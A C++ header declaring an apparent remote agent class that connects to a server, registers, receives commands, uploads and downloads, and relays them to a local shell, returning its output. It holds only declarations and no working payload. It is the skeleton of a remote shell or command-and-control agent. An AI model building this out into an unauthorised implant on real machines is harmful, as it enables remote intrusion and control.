#pragma once
#include "pips.hpp"
#include "utils.hpp"
#include "common/parser/tcp.hpp"
#include <deque>
#include <thread>

#include <arpa/inet.h>

constexpr uint32_t READ_FLAGS  = EPOLLIN  | EPOLLET | EPOLLONESHOT | EPOLLRDHUP;
constexpr uint32_t WRITE_FLAGS = EPOLLOUT | EPOLLET | EPOLLONESHOT;
constexpr uint32_t PIPE_READ_FLAGS  = EPOLLIN  | EPOLLET | EPOLLONESHOT;
constexpr uint32_t PIPE_WRITE_FLAGS = EPOLLOUT | EPOLLET | EPOLLONESHOT;

constexpr size_t SEND_BUF_SIZE = 8192;
constexpr size_t RECV_BUF_SIZE = 8192;
constexpr size_t FLUSH_THRESHOLD = 8000;
constexpr int MAX_EVENTS = 16;
/**
    * @struct Entry
    * @brief Represents a single command task in the queue.
    */
struct Entry {
    uint32_t taskId{0};
    uint8_t stdinBuf[RECV_BUF_SIZE]{};
    size_t stdinLen{0};
    size_t stdinOffset{0};
    uint8_t outBuf[SEND_BUF_SIZE]{};
    size_t  outLen{0};
    size_t  outOffset{0};
    bool done{false};
};

class Agent : public Raptor::Common::Parsers::TcpParser<uint8_t, sizeof(Raptor::Common::Register)> {
    public:
    /**
        * @brief Construct a new Agent
        * @param ip Server IP address
        * @param port Server port
        */
    explicit Agent(const std::string& ip, uint16_t port);

    ~Agent() override;

    /**
        * @brief Main event loop
        */
    void run();

    private:
    std::string ip_{"127.0.0.1"};
    uint16_t port_{8080};
    Pip  pipfds_{};
    int epollfd_{-1};
    int clientfd_{-1};

    std::deque<Entry> queue_;
    std::array<epoll_event, MAX_EVENTS>  epollEvents_{};
    std::array<uint8_t, sizeof(Raptor::Common::Register)> tmpBuffer_{};
    bool connect();
    void registerAgent();


    void readClient() noexcept;
    void writeClient() noexcept;
    void writeToShell() noexcept;
    void readShell(int fd) noexcept;
    void flushToClient(Entry& entry) noexcept;

    void onCommand(const Raptor::Common::Header& hdr, std::string_view cmd) noexcept override;
    void onUpload(const Raptor::Common::Header&, std::string_view) noexcept override;
    void onDownload(const Raptor::Common::Header&, std::string_view) noexcept override;

};
